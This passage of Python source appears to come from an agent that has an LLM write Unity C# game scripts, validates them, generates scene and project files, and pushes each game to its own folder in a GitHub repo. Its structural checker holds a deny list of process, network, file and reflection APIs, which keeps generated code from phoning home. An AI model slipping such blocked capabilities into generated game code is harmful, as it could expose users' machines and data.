            "MonoBehaviour), use [ServerRpc]/[ClientRpc] methods for actions, and Unity.Netcode.NetworkVariable<T> for "
            "synced state. Add \"using Unity.Netcode;\" to any file that uses these. Do NOT use raw sockets, HttpClient, "
            "UnityWebRequest, UnityEngine.Networking (legacy), or any other networking API — Netcode for GameObjects is "
            "the only networking allowed.")
    else:
        networking_rule = "- Do not use any networking, file I/O, System.Diagnostics.Process, or reflection — self-contained gameplay code only."
    dimension = str((design or {}).get("dimension") or "2D").strip().upper()
    if dimension.startswith("3"):
        physics_rule = ("- This is a 3D game: use Rigidbody + Collider (BoxCollider/SphereCollider/CapsuleCollider/MeshCollider) "
            "for movement/physics/collision, and Vector3/Transform.position in 3 dimensions (x/y/z) — not the 2D variants.")
    else:
        physics_rule = ("- This is a 2D game: use Rigidbody2D + Collider2D (BoxCollider2D/CircleCollider2D/PolygonCollider2D) "
            "for movement/physics/collision, and keep gameplay on the x/y plane (z fixed) — not the 3D variants.")
    prompt = """Write the full C# source for a small Unity game for this request: """ + idea + design_block + error_block + """

Reply as JSON only (no commentary, no markdown fences). Schema:
{
  "files": {
    "Assets/Scripts/<Filename>.cs": "<complete C# file contents>",
    ...
  },
  "setup_notes": "<plain-English steps for wiring these into a scene by hand in the Unity Editor>"
}
Rules:
- Every entry's C# class name MUST exactly match its filename (Unity requirement — mismatches fail to compile).
- Every MonoBehaviour or NetworkBehaviour file must start with "using UnityEngine;" (plus any other needed usings).
- Write complete, real logic — no "// TODO: implement" placeholders anywhere.
""" + networking_rule + """
""" + physics_rule + """
- Use Unity's built-in systems, don't reinvent them: Unity's Input class for controls, Unity UI (Canvas/Button/Text/Image) for any HUD/menu, AudioSource for sound, Animator for animation, coroutines (not manual timers) for delays. Only write custom logic for things Unity has no built-in for — scoring, spawn rules, enemy AI, win/lose state.
- Braces must balance and the code must be syntactically valid C#.
Reply with ONLY the JSON object."""

    response = ask_ai(prompt)
    retry_count = 0
    while response.startswith("ERROR") and retry_count < 2:
        time.sleep(5)
        response = ask_ai(prompt)
        retry_count += 1
    parsed = _parse_json_loose(response)
    if not isinstance(parsed, dict) or not isinstance(parsed.get("files"), dict) or not parsed["files"]:
        return None
    return parsed

def check_unity_output_structural(project, idea, design=None):
    """
    Structural quality gate for the script-only Unity lane. Can't compile
    C# here, so this checks the things that would otherwise silently fail
    in the Editor: filename/class-name match (Unity's hard requirement),
    balanced braces, presence of "using UnityEngine;" on MonoBehaviours,
    and the banned-API list from write_code_for_unity's own prompt.
    Returns (passed: bool, reason: str).
    """
    if not isinstance(project, dict) or not isinstance(project.get("files"), dict) or not project["files"]:
        return False, "No files were generated."
    files = project["files"]
    banned_patterns = ["System.Diagnostics.Process", "System.Net", "System.IO.File", "System.Reflection", "UnityEngine.Networking"]
    for path, content in files.items():
        if not path.endswith(".cs"):
            continue
        filename = os.path.basename(path)
        class_name = filename[:-3]
        if not re.match(r"^[A-Za-z_][A-Za-z0-9_]*$", class_name):
            return False, "Filename '" + filename + "' isn't a valid C# identifier."
        if not re.search(r"\bclass\s+" + re.escape(class_name) + r"\b", content):
            return False, "File '" + filename + "' has no class named '" + class_name + "' — Unity requires filename and class name to match exactly."
        if ("MonoBehaviour" in content or "NetworkBehaviour" in content) and "using UnityEngine;" not in content:
            return False, "File '" + filename + "' uses MonoBehaviour/NetworkBehaviour but is missing 'using UnityEngine;'."
        if "NetworkBehaviour" in content and "using Unity.Netcode;" not in content:
            return False, "File '" + filename + "' uses NetworkBehaviour but is missing 'using Unity.Netcode;'."
        if content.count("{") != content.count("}"):
            return False, "File '" + filename + "' has unbalanced braces — would fail to compile."
        for banned in banned_patterns:
            if banned in content:
                return False, "File '" + filename + "' uses disallowed API '" + banned + "'."
    if design:
        expected = {s.get("filename", "").strip() for s in design.get("scripts", []) if s.get("filename")}
        got = {os.path.basename(p) for p in files if p.endswith(".cs")}
        missing = expected - got
        if missing:
            return False, "Design called for scripts that weren't generated: " + ", ".join(sorted(missing))
    return True, "OK"

def _stable_guid(seed):
    """Deterministic 32-hex-char Unity-style GUID from a seed string (md5 of
    the seed). Deterministic on purpose: re-running the same idea produces
    the same script/scene GUIDs instead of new ones each attempt."""
    return hashlib.md5(seed.encode("utf-8")).hexdigest()

def generate_unity_script_meta(guid):
    return ("fileFormatVersion: 2\n"
            "guid: " + guid + "\n"
            "MonoImporter:\n"
            "  externalObjects: {}\n"
            "  serializedVersion: 2\n"
            "  defaultReferences: []\n"
            "  executionOrder: 0\n"
            "  icon: {instanceID: 0}\n"
            "  userData: \n"
            "  assetBundleName: \n"
            "  assetBundleVariant: \n")

_UNITY_SCENE_GLOBALS = """--- !u!29 &1
OcclusionCullingSettings:
  m_ObjectHideFlags: 0
  serializedVersion: 2
  m_OcclusionBakeSettings:
    smallestOccluder: 5
    smallestHole: 0.25
    backfaceThreshold: 100
  m_SceneGUID: 00000000-0000-0000-0000-000000000000
  m_OcclusionCullingData: {fileID: 0}
--- !u!104 &2
RenderSettings:
  m_ObjectHideFlags: 0
  serializedVersion: 9
  m_Fog: 0
  m_FogColor: {r: 0.5, g: 0.5, b: 0.5, a: 1}
  m_FogMode: 3
  m_FogDensity: 0.01
  m_LinearFogStart: 0
  m_LinearFogEnd: 300
  m_AmbientSkyColor: {r: 0.212, g: 0.227, b: 0.259, a: 1}
  m_AmbientEquatorColor: {r: 0.114, g: 0.125, b: 0.133, a: 1}
  m_AmbientGroundColor: {r: 0.047, g: 0.043, b: 0.035, a: 1}
  m_AmbientIntensity: 1
  m_AmbientMode: 0
  m_SubtractiveShadowColor: {r: 0.42, g: 0.478, b: 0.627, a: 1}
  m_SkyboxMaterial: {fileID: 10304, guid: 0000000000000000f000000000000000, type: 0}
  m_HaloStrength: 0.5
  m_FlareStrength: 1
  m_FlareFadeSpeed: 3
  m_HaloTexture: {fileID: 0}
  m_SpotCookie: {fileID: 10001, guid: 0000000000000000e000000000000000, type: 0}
  m_DefaultReflectionMode: 0
  m_DefaultReflectionResolution: 128
  m_ReflectionBounces: 1
  m_ReflectionIntensity: 1
  m_CustomReflection: {fileID: 0}
  m_Sun: {fileID: 0}
  m_IndirectSpecularColor: {r: 0.44657898, g: 0.4964133, b: 0.5748178, a: 1}
  m_UseRadianceAmbientProbe: 0
--- !u!157 &3
LightmapSettings:
  m_ObjectHideFlags: 0
  serializedVersion: 12
  m_GIWorkflowMode: 1
  m_GISettings:
    serializedVersion: 2
    m_BounceScale: 1
    m_IndirectOutputScale: 1
    m_AlbedoBoost: 1
    m_EnvironmentLightingMode: 0
    m_EnableBakedLightmaps: 1
    m_EnableRealtimeLightmaps: 0
  m_LightmapEditorSettings:
    serializedVersion: 12
    m_Resolution: 2
    m_BakeResolution: 40
    m_AtlasSize: 1024
    m_AO: 0
    m_AOMaxDistance: 1
    m_CompAOExponent: 1
    m_CompAOExponentDirect: 0
    m_ExtractAmbientOcclusion: 0
    m_Padding: 2
    m_LightmapParameters: {fileID: 0}
    m_LightmapsBakeMode: 1
    m_TextureCompression: 1
    m_FinalGather: 0
    m_FinalGatherFiltering: 1
    m_FinalGatherRayCount: 256
    m_ReflectionCompression: 2
    m_MixedBakeMode: 2
    m_BakeBackend: 1
    m_PVRSampling: 1
    m_PVRDirectSampleCount: 32
    m_PVRSampleCount: 512
    m_PVRBounces: 2
    m_PVREnvironmentSampleCount: 256
    m_PVREnvironmentReferencePointCount: 2048
    m_PVRFilteringMode: 1
    m_PVRDenoiserTypeDirect: 0
    m_PVRDenoiserTypeIndirect: 0
    m_PVRDenoiserTypeAO: 0
    m_PVRFilterTypeDirect: 0
    m_PVRFilterTypeIndirect: 0
    m_PVRFilterTypeAO: 0
    m_PVREnvironmentMIS: 0
    m_PVRCulling: 1
    m_PVRFilteringGaussRadiusDirect: 1
    m_PVRFilteringGaussRadiusIndirect: 5
    m_PVRFilteringGaussRadiusAO: 2
    m_PVRFilteringAtrousPositionSigmaDirect: 0.5
    m_PVRFilteringAtrousPositionSigmaIndirect: 2
    m_PVRFilteringAtrousPositionSigmaAO: 1
    m_ExportTrainingData: 0
    m_TrainingDataDestination: TrainingData
    m_LightProbeSampleCountMultiplier: 4
  m_LightingDataAsset: {fileID: 0}
  m_LightingSettings: {fileID: 0}
--- !u!196 &4
NavMeshSettings:
  serializedVersion: 2
  m_ObjectHideFlags: 0
  m_BuildSettings:
    serializedVersion: 3
    agentTypeID: 0
    agentRadius: 0.5
    agentHeight: 2
    agentSlope: 45
    agentClimb: 0.4
    ledgeDropHeight: 0
    maxJumpAcrossDistance: 0
    minRegionArea: 2
    manualCellSize: 0
    cellSize: 0.16666667
    manualTileSize: 0
    tileSize: 256
    buildHeightMesh: 0
    maxJobWorkers: 0
    preserveTilesOutsideBounds: 0
    debug:
      m_Flags: 0
  m_NavMeshData: {fileID: 0}"""

_UNITY_PRIMITIVE_MESH_FILEIDS = {
    "cube": 10202, "sphere": 10207, "capsule": 10208,
    "cylinder": 10206, "plane": 10209, "quad": 10210,
}
_UNITY_BUILTIN_EXTRA_GUID = "0000000000000000e000000000000000"
_UNITY_DEFAULT_MATERIAL_FILEID = 10303
_UNITY_DEFAULT_MATERIAL_GUID = "0000000000000000f000000000000000"

def generate_unity_scene(design, script_guids):
    """
    Builds a real, directly-openable classic-YAML .unity scene: a Main
    Camera, a Directional Light, and one GameObject per entry in
    design["gameobjects"] — with its MonoBehaviour(s) attached via their
    .meta GUIDs, placed at its own position/scale (auto-spread if the
    design didn't specify one), and given a visible built-in primitive
    mesh when requested instead of sitting invisible at the origin. The
    camera is positioned and angled to actually frame where things ended
    up, and is orthographic for a 2D design or perspective/angled-down
    for a 3D one — not left at Unity's raw default. This is the actual
    scene-composition step that a script-only scaffold can't do — the
    tradeoff (stated honestly, not hidden) is that this hand-written YAML
    is more brittle than a scene Unity itself saved: if the Editor
    complains on first open, deleting Library/ and reopening usually
    resolves stale-cache issues, but a genuinely malformed block would
    need manual fixing.
    """
    dimension = str(design.get("dimension") or "2D").strip().upper()
    is_3d = dimension.startswith("3")

    counter = [0]
    def nid():
        counter[0] += 1
        return counter[0] * 7 + 91

    blocks = [_UNITY_SCENE_GLOBALS]
    roots = []

    def add_object(name, component_defs, position=(0, 0, 0), rotation=(0, 0, 0, 1), scale=(1, 1, 1)):
        go_id = nid()
        transform_id = nid()
        comp_ids = [nid() for _ in component_defs]
        comp_refs = "\n".join("  - component: {fileID: " + str(cid) + "}" for cid in [transform_id] + comp_ids)
        blocks.append(
            "--- !u!1 &" + str(go_id) + "\n"
            "GameObject:\n"
            "  m_ObjectHideFlags: 0\n"
            "  m_CorrespondingSourceObject: {fileID: 0}\n"
            "  m_PrefabInstance: {fileID: 0}\n"
            "  m_PrefabAsset: {fileID: 0}\n"
            "  serializedVersion: 6\n"
            "  m_Component:\n" + comp_refs + "\n"
            "  m_Layer: 0\n"
            "  m_Name: " + name + "\n"
            "  m_TagString: Untagged\n"
            "  m_Icon: {fileID: 0}\n"
            "  m_NavMeshLayer: 0\n"
            "  m_StaticEditorFlags: 0\n"
            "  m_IsActive: 1"
        )
        px, py, pz = position
        rx, ry, rz, rw = rotation
        sx, sy, sz = scale
        blocks.append(
            "--- !u!4 &" + str(transform_id) + "\n"
            "Transform:\n"
            "  m_ObjectHideFlags: 0\n"
            "  m_CorrespondingSourceObject: {fileID: 0}\n"
            "  m_PrefabInstance: {fileID: 0}\n"
            "  m_PrefabAsset: {fileID: 0}\n"
            "  m_GameObject: {fileID: " + str(go_id) + "}\n"
            "  m_LocalRotation: {x: " + str(rx) + ", y: " + str(ry) + ", z: " + str(rz) + ", w: " + str(rw) + "}\n"
            "  m_LocalPosition: {x: " + str(px) + ", y: " + str(py) + ", z: " + str(pz) + "}\n"
            "  m_LocalScale: {x: " + str(sx) + ", y: " + str(sy) + ", z: " + str(sz) + "}\n"
            "  m_ConstrainProportionsScale: 0\n"
            "  m_Children: []\n"
            "  m_Father: {fileID: 0}\n"
            "  m_LocalEulerAnglesHint: {x: 0, y: 0, z: 0}"
        )
        for cid, (class_id, header, body) in zip(comp_ids, component_defs):
            blocks.append("--- !u!" + str(class_id) + " &" + str(cid) + "\n" + header + ":\n" + body.replace("{GO_ID}", str(go_id)))
        # BUG FIX: Unity's SceneRoots.m_Roots list references root
        # TRANSFORM fileIDs, not GameObject fileIDs (this previously
        # appended go_id, the GameObject's own id, which doesn't match
        # what a scene Unity itself saves would contain).
        roots.append(transform_id)
        return go_id

    # ---- figure out where things actually end up, so the camera has something real to frame ----
    raw_entries = design.get("gameobjects") or []
    positions = []
    for i, entry in enumerate(raw_entries):
        pos = entry.get("position")
        if isinstance(pos, dict) and all(k in pos for k in ("x", "y", "z")):
            positions.append((float(pos["x"]), float(pos["y"]), float(pos["z"])))
        else:
            # Auto-layout fallback when the design didn't place this one:
            # spread along x so objects don't stack at the origin, with a
            # slight y offset per index to reduce z-fighting/overlap.
            name_l = str(entry.get("name") or "").lower()
            if "ground" in name_l or "floor" in name_l:
                positions.append((0.0, -1.0 if is_3d else -3.0, 0.0))
            else:
                spread = (i - (len(raw_entries) - 1) / 2.0) * (2.5 if is_3d else 2.0)
                positions.append((spread, 0.0, 0.0 if is_3d else 0.0))

    if positions:
        cx = sum(p[0] for p in positions) / len(positions)
        cy = sum(p[1] for p in positions) / len(positions)
        cz = sum(p[2] for p in positions) / len(positions)
        spread_radius = max([abs(p[0] - cx) for p in positions] + [abs(p[2] - cz) for p in positions] + [3.0])
    else:
        cx, cy, cz = 0.0, 0.0, 0.0
        spread_radius = 5.0

    if is_3d:
        # Perspective camera pulled back and angled down ~25.8° (rotation
        # quaternion for a -25.8° pitch about X) so it frames the whole
        # layout instead of staring at the origin from Unity's raw default.
        cam_distance = max(8.0, spread_radius * 1.8)
        cam_pos = (round(cx, 2), round(cy + cam_distance * 0.45, 2), round(cz - cam_distance, 2))
        cam_rot = (0.2181432, 0.0, 0.0, 0.9759168)  # ~-25.8 degrees pitch, looking down/forward
        cam_orthographic = 0
    else:
        cam_pos = (round(cx, 2), round(cy, 2), -10.0)
        cam_rot = (0, 0, 0, 1)
        cam_orthographic = 1

    camera_body = (
        "  m_ObjectHideFlags: 0\n  m_CorrespondingSourceObject: {fileID: 0}\n"
        "  m_PrefabInstance: {fileID: 0}\n  m_PrefabAsset: {fileID: 0}\n"
        "  m_GameObject: {fileID: {GO_ID}}\n  m_Enabled: 1\n  serializedVersion: 2\n"
        "  m_ClearFlags: 1\n  m_BackGroundColor: {r: 0.19215687, g: 0.3019608, b: 0.4745098, a: 0}\n"
        "  m_projectionMatrixMode: 1\n  m_GateFitMode: 2\n  m_FOVAxisMode: 0\n"
        "  m_SensorSize: {x: 36, y: 24}\n  m_LensShift: {x: 0, y: 0}\n"
        "  m_NormalizedViewPortRect:\n    serializedVersion: 2\n    x: 0\n    y: 0\n    width: 1\n    height: 1\n"
        "  near clip plane: 0.3\n  far clip plane: 1000\n  field of view: 60\n"
        "  orthographic: " + str(cam_orthographic) + "\n  orthographic size: " + str(max(5.0, spread_radius)) + "\n  m_Depth: -1\n"
        "  m_CullingMask:\n    serializedVersion: 2\n    m_Bits: 4294967295\n"
        "  m_RenderingPath: -1\n  m_TargetTexture: {fileID: 0}\n  m_TargetDisplay: 0\n"
        "  m_TargetEye: 3\n  m_HDR: 1\n  m_AllowMSAA: 1\n  m_AllowDynamicResolution: 0\n"
        "  m_ForceIntoRT: 0\n  m_OcclusionCulling: 1\n  m_StereoConvergence: 10\n  m_StereoSeparation: 0.022"
    )
    audio_listener_body = (
        "  m_ObjectHideFlags: 0\n  m_CorrespondingSourceObject: {fileID: 0}\n"
        "  m_PrefabInstance: {fileID: 0}\n  m_PrefabAsset: {fileID: 0}\n"
        "  m_GameObject: {fileID: {GO_ID}}\n  m_Enabled: 1"
    )
    add_object("Main Camera", [(20, "Camera", camera_body), (81, "AudioListener", audio_listener_body)],
               position=cam_pos, rotation=cam_rot)

    light_body = (
        "  m_ObjectHideFlags: 0\n  m_CorrespondingSourceObject: {fileID: 0}\n"
        "  m_PrefabInstance: {fileID: 0}\n  m_PrefabAsset: {fileID: 0}\n"
        "  m_GameObject: {fileID: {GO_ID}}\n  m_Enabled: 1\n  serializedVersion: 11\n"
        "  m_Type: 1\n  m_Shape: 0\n  m_Color: {r: 1, g: 0.9568627, b: 0.8392157, a: 1}\n"
        "  m_Intensity: 1\n  m_Range: 10\n  m_SpotAngle: 30\n  m_InnerSpotAngle: 21.80208\n"
        "  m_CookieSize: 10\n"
        "  m_Shadows:\n    m_Type: 2\n    m_Resolution: -1\n    m_CustomResolution: -1\n"
        "    m_Strength: 1\n    m_Bias: 0.05\n    m_NormalBias: 0.4\n    m_NearPlane: 0.2\n"
        "    m_UseCullingMatrixOverride: 0\n"
        "  m_Cookie: {fileID: 0}\n  m_DrawHalo: 0\n  m_Flare: {fileID: 0}\n  m_RenderMode: 0\n"
        "  m_CullingMask:\n    serializedVersion: 2\n    m_Bits: 4294967295\n"
        "  m_RenderingLayerMask: 1\n  m_Lightmapping: 4\n  m_LightShadowCasterMode: 0\n"
        "  m_AreaSize: {x: 1, y: 1}\n  m_BounceIntensity: 1\n  m_ColorTemperature: 6570\n"
        "  m_UseColorTemperature: 0\n  m_BoundingSphereOverride: {x: 0, y: 0, z: 0, w: 0}\n"
        "  m_UseBoundingSphereOverride: 0\n  m_UseViewFrustumForShadowCasterCull: 1\n"
        "  m_ShadowRadius: 0\n  m_ShadowAngle: 0"
    )
    # Angle the light to match the camera's 3D framing; straight down works fine for 2D.
    light_rot = (0.2652, 0.3502, -0.1036, 0.8925) if is_3d else (0, 0, 0, 1)
    add_object("Directional Light", [(108, "Light", light_body)], rotation=light_rot)

    for entry, pos in zip(raw_entries, positions):
        name = str(entry.get("name") or "GameObject").strip() or "GameObject"
        comps = []
        for script_filename in (entry.get("scripts") or []):
            guid = script_guids.get(script_filename)
            if not guid:
                continue
            mono_body = (
                "  m_ObjectHideFlags: 0\n  m_CorrespondingSourceObject: {fileID: 0}\n"
                "  m_PrefabInstance: {fileID: 0}\n  m_PrefabAsset: {fileID: 0}\n"
                "  m_GameObject: {fileID: {GO_ID}}\n  m_Enabled: 1\n  m_EditorHideFlags: 0\n"
                "  m_Script: {fileID: 11500000, guid: " + guid + ", type: 3}\n"
                "  m_Name: \n  m_EditorClassIdentifier: "
            )
            comps.append((114, "MonoBehaviour", mono_body))

        primitive = str(entry.get("primitive") or "none").strip().lower()
        mesh_fileid = _UNITY_PRIMITIVE_MESH_FILEIDS.get(primitive)
        if mesh_fileid:
            mesh_filter_body = (
                "  m_ObjectHideFlags: 0\n  m_CorrespondingSourceObject: {fileID: 0}\n"
                "  m_PrefabInstance: {fileID: 0}\n  m_PrefabAsset: {fileID: 0}\n"
                "  m_GameObject: {fileID: {GO_ID}}\n"
                "  m_Mesh: {fileID: " + str(mesh_fileid) + ", guid: " + _UNITY_BUILTIN_EXTRA_GUID + ", type: 0}"
            )
            comps.append((33, "MeshFilter", mesh_filter_body))
            mesh_renderer_body = (
                "  m_ObjectHideFlags: 0\n  m_CorrespondingSourceObject: {fileID: 0}\n"
                "  m_PrefabInstance: {fileID: 0}\n  m_PrefabAsset: {fileID: 0}\n"
                "  m_GameObject: {fileID: {GO_ID}}\n  m_Enabled: 1\n"
                "  m_CastShadows: 1\n  m_ReceiveShadows: 1\n  m_DynamicOccludee: 1\n  m_StaticShadowCaster: 0\n"
                "  m_MotionVectors: 1\n  m_LightProbeUsage: 1\n  m_ReflectionProbeUsage: 1\n  m_RayTracingMode: 2\n"
                "  m_RayTraceProcedural: 0\n  m_RenderingLayerMask: 1\n  m_RendererPriority: 0\n"
                "  m_Materials:\n  - {fileID: " + str(_UNITY_DEFAULT_MATERIAL_FILEID) + ", guid: " + _UNITY_DEFAULT_MATERIAL_GUID + ", type: 0}\n"
                "  m_StaticBatchInfo:\n    firstSubMesh: 0\n    subMeshCount: 0\n"
                "  m_StaticBatchRoot: {fileID: 0}\n  m_ProbeAnchor: {fileID: 0}\n  m_LightProbeVolumeOverride: {fileID: 0}\n"
                "  m_ScaleInLightmap: 1\n  m_ReceiveGI: 1\n  m_PreserveUVs: 0\n  m_IgnoreNormalsForChartDetection: 0\n"
                "  m_ImportantGI: 0\n  m_StitchLightmapSeams: 1\n  m_SelectedEditorRenderState: 3\n  m_MinimumChartSize: 4\n"
                "  m_AutoUVMaxDistance: 0.5\n  m_AutoUVMaxAngle: 89\n  m_LightmapParameters: {fileID: 0}\n"
                "  m_SortingLayerID: 0\n  m_SortingLayer: 0\n  m_SortingOrder: 0\n  m_AdditionalVertexStreams: {fileID: 0}"
            )
            comps.append((23, "MeshRenderer", mesh_renderer_body))

        scale_dict = entry.get("scale")
        if isinstance(scale_dict, dict) and all(k in scale_dict for k in ("x", "y", "z")):
            obj_scale = (float(scale_dict["x"]), float(scale_dict["y"]), float(scale_dict["z"]))
        else:
            obj_scale = (1, 1, 1)

        add_object(name, comps, position=pos, scale=obj_scale)

    scene_roots_id = nid()
    blocks.append(
        "--- !u!1660057539 &" + str(scene_roots_id) + "\n"
        "SceneRoots:\n  m_ObjectHideFlags: 0\n  m_Roots:\n"
        + "\n".join("  - {fileID: " + str(r) + "}" for r in roots)
    )
    return "%YAML 1.1\n%TAG !u! tag:unity3d.com,2011:\n" + "\n".join(blocks) + "\n"

def generate_unity_scene_and_metas(project, design, slug=""):
    """
    Given the generated project's files and its design, produces the extra
    files needed for a real, wired-up starter scene: a .meta (with a
    stable GUID) for every .cs script, an Assets/Scenes/Main.unity scene
    with those scripts already attached to GameObjects, the scene's own
    .meta, and a ProjectSettings/EditorBuildSettings.asset registering
    Main.unity as build index 0 so it's the scene that opens by default.
    Returns a dict of {path: content} to merge into project["files"].

    BUG FIX: GUIDs used to be seeded from the script filename alone
    (_stable_guid("script:" + filename)). Since write_code_for_unity's own
    prompt nudges toward common names ("at minimum a player controller and
    a game manager"), two unrelated games both very plausibly generate a
    PlayerController.cs/GameManager.cs — and used to get IDENTICAL Unity
    GUIDs as a result. `slug` (a per-project identifier, e.g. "tool_7")
    is now folded into every GUID seed so different projects never collide,
    even if/when their files end up in the same repo.
    """
    extra = {}
    script_guids = {}
    for path in project["files"]:
        if path.endswith(".cs"):
            filename = os.path.basename(path)
            guid = _stable_guid("script:" + str(slug) + ":" + filename)
            script_guids[filename] = guid
            extra[path + ".meta"] = generate_unity_script_meta(guid)

    scene_guid = _stable_guid("scene:" + str(slug) + ":Main.unity:" + str(design.get("title", "") if design else ""))
    extra["Assets/Scenes/Main.unity"] = generate_unity_scene(design or {}, script_guids)
    extra["Assets/Scenes/Main.unity.meta"] = (
        "fileFormatVersion: 2\nguid: " + scene_guid + "\nDefaultImporter:\n"
        "  externalObjects: {}\n  userData: \n  assetBundleName: \n  assetBundleVariant: \n"
    )
    extra["ProjectSettings/EditorBuildSettings.asset"] = (
        "%YAML 1.1\n%TAG !u! tag:unity3d.com,2011:\n--- !u!1045 &1\nEditorBuildSettings:\n"
        "  m_ObjectHideFlags: 0\n  serializedVersion: 2\n  m_Scenes:\n"
        "  - enabled: 1\n    path: Assets/Scenes/Main.unity\n    guid: " + scene_guid + "\n"
        "  m_configObjects: {}\n"
    )
    return extra

def push_unity_project_to_github(project, repo_name, idea, design=None, slug=None):
    """
    Pushes the generated scripts plus a minimal, valid project scaffold
    (Packages/manifest.json, .gitignore, README with setup notes) to the
    dedicated Unity tools repo, ready to be opened directly in the Unity
    Editor via "Add project from disk" after cloning. Returns (ok, url_or_error).

    BUG FIX: every Unity project used to be pushed to the SAME fixed paths
    (Assets/Scripts/<Filename>.cs, Assets/Scenes/Main.unity, README.md,
    Packages/manifest.json) inside the one shared UNITY_REPO_NAME repo.
    create_github_file() does a create-or-overwrite PUT, so building a
    second game after a first would silently clobber the first game's
    scripts/scene/README the moment they happened to share a filename
    (very likely — "PlayerController.cs"/"GameManager.cs" are the
    suggested defaults in write_code_for_unity's own prompt). Every file
    is now written under a per-project "games/<slug>/" prefix instead, so
    each build gets its own self-contained Unity project folder inside
    the shared repo (Unity Hub can open any subfolder as a project root,
    as long as that folder itself directly contains Assets/Packages/
    ProjectSettings — which it now does).
    """
    slug = str(slug or _slugify_for_placeholder(idea, max_len=40) or "game").strip("/")
    project_root = "games/" + slug + "/"

    multiplayer = bool(design and design.get("multiplayer"))
    scene_files = generate_unity_scene_and_metas(project, design or {}, slug=slug)
    all_files = dict(project["files"])
    all_files.update(scene_files)
    # Namespace every generated file under the per-project folder.
    all_files = {project_root + path: content for path, content in all_files.items()}

    print(create_github_repo(repo_name, description="Unity game scaffolds built by my agent"))
    for path, content in all_files.items():
        ok, result = create_github_file(repo_name, path, content, "Add " + path)
        if not ok:
            return False, "Failed to push " + path + ": " + result
    dependencies = {
        "com.unity.modules.physics": "1.0.0",
        "com.unity.modules.physics2d": "1.0.0",
        "com.unity.modules.ui": "1.0.0"
    }
    if multiplayer:
        # Unity's official Netcode for GameObjects — a sandboxed, Unity-maintained
        # multiplayer package, deliberately carved out as the one networking
        # exception (see write_code_for_unity's networking_rule) since it isn't
        # raw sockets/HTTP that generated code could use to phone home.
        dependencies["com.unity.netcode.gameobjects"] = "1.9.1"
        dependencies["com.unity.transport"] = "2.2.1"
    manifest = json.dumps({"dependencies": dependencies}, indent=2)
    create_github_file(repo_name, project_root + "Packages/manifest.json", manifest, "Add package manifest for " + slug)
    create_github_file(repo_name, project_root + ".gitignore", "Library/\nTemp/\nObj/\nBuild/\nBuilds/\nLogs/\nUserSettings/\n", "Add .gitignore for " + slug)
    setup_notes = project.get("setup_notes", "") or (design.get("scene_setup_notes", "") if design else "")
    title = (design.get("title") if design else None) or idea
    dimension = str(design.get("dimension") or "2D").strip().upper() if design else "2D"
    is_3d = dimension.startswith("3")
    scene_note = ("\n\n## Scene\nAssets/Scenes/Main.unity is included and pre-registered in Build Settings, "
                  "built as a " + ("3D" if is_3d else "2D") + " scene with a Main Camera, a Directional Light, "
                  "and one GameObject per design entry — each placed at its own position (auto-spread instead of "
                  "stacked at the origin if the design didn't specify one) and given a visible built-in primitive "
                  "mesh where the design called for one, plus its MonoBehaviour script(s) already attached. The "
                  "camera is " + ("angled down and pulled back to frame the whole layout" if is_3d else "an orthographic camera centered on the layout") +
                  " instead of Unity's raw default. It's hand-written YAML, not something Unity itself saved — if "
                  "the Editor throws warnings on first open, that's most likely stale-cache noise (safe to ignore "
                  "or clear by deleting Library/ and reopening), not a sign the scripts are wrong. You'll still "
                  "likely want to swap primitives for real sprites/models/prefabs and fine-tune positions by hand.")
    multiplayer_note = ("\n\n## Multiplayer\nThis game uses Unity's official Netcode for GameObjects package "
                  "(added to Packages/manifest.json). The scripts are written against NetworkBehaviour/"
                  "[ServerRpc]/[ClientRpc], but the scene does NOT include a NetworkManager GameObject — that "
                  "has to be added by hand in the Editor (GameObject > Create Empty, add a NetworkManager "
                  "component, assign a Player Prefab, add Unity Transport as the transport). I can't reliably "
                  "pre-wire that one because it references the package's own compiled GUIDs, which aren't safe "
                  "to guess.") if multiplayer else ""
    readme = ("# " + str(title) + "\n\nGenerated by my agent — Unity project scaffold with a real starter scene "
              "(no Unity license available to build/compile automatically, so this hasn't been opened in a real "
              "Editor).\n\nThis project lives in its own folder inside a shared repo so it doesn't collide with "
              "other generated games — make sure you open THIS folder (`" + project_root.rstrip('/') + "`), not "
              "the repo root, in Unity Hub.\n\n"
              "## Idea\n" + idea + "\n\n## How to use\n1. Clone this repo.\n"
              "2. In Unity Hub, use \"Add project from disk\" and select the `" + project_root.rstrip('/') +
              "` folder specifically — Main.unity should load automatically.\n"
              "3. Follow the setup notes below for anything not already wired.\n\n## Setup notes\n" + str(setup_notes)
              + scene_note + multiplayer_note + "\n")
    create_github_file(repo_name, project_root + "README.md", readme, "Add README for " + slug)
    username = get_github_username()
    url = "https://github.com/" + username + "/" + repo_name + "/tree/main/" + project_root.rstrip("/")
    return True, url

def find_matching_unity_tool(idea):
    unity_tools = [t for t in load_tools_index() if t.get("type") == "unity"]
    if not unity_tools:
        return None
    ranked = semantic_rank(idea, {t["id"]: t["idea"] for t in unity_tools})
    if not ranked or ranked[0][1] < SEMANTIC_PREFILTER_MIN_SCORE:
        return None
    top_ids = {doc_id for doc_id, _ in ranked[:SEMANTIC_PREFILTER_TOP_K]}
    narrowed = [t for t in unity_tools if t["id"] in top_ids] or unity_tools
    listing = "\n".join(t["id"] + ": " + t["idea"] for t in narrowed)
    prompt = """Unity game scaffolds already built:
""" + listing + """

New request: """ + idea + """

Does an existing scaffold already do this — the SAME game, not just "also a game" or a similar genre? Only answer with its id if you are confident it is genuinely the same deliverable. If none is a confident match, or you're unsure, reply NONE — reusing the wrong project is worse than building a new one.
Reply with ONLY the tool id or NONE."""
    answer = ask_ai(prompt).strip()
    for t in narrowed:
        if t["id"] == answer and is_tool_trustworthy(t):
            return t
    return None

def register_unity_tool(idea, url, repo_name, tool_id=None):
    """
    BUG FIX: now accepts an optional `tool_id` (the same slug reserved and
    used as the "games/<slug>/" folder name when the project was pushed —
    see build_and_fix_unity_workflow). Previously this always minted a
    FRESH id here, after the fact, so the id stored in the tools index
    never matched the folder the files actually lived under — there was
    no way to look at a registered Unity tool and know which subfolder of
    the shared repo was actually its. If no tool_id is passed (e.g. old
    callers), falls back to minting a new one as before.
    """
    time_sensitive = is_time_sensitive(idea)
    with _tools_index_lock:
        index = load_tools_index()
        if tool_id:
            # Fill in the placeholder reserved earlier in
            # build_and_fix_unity_workflow instead of appending a second,
            # duplicate-id entry.
            existing = next((t for t in index if t.get("id") == tool_id), None)
            if existing is not None:
                existing.update({
                    "idea": idea, "type": "unity", "url": url, "repo_name": repo_name,
                    "time_sensitive": time_sensitive
                })
                existing.pop("pending", None)
                save_tools_index(index)
                return tool_id
        else:
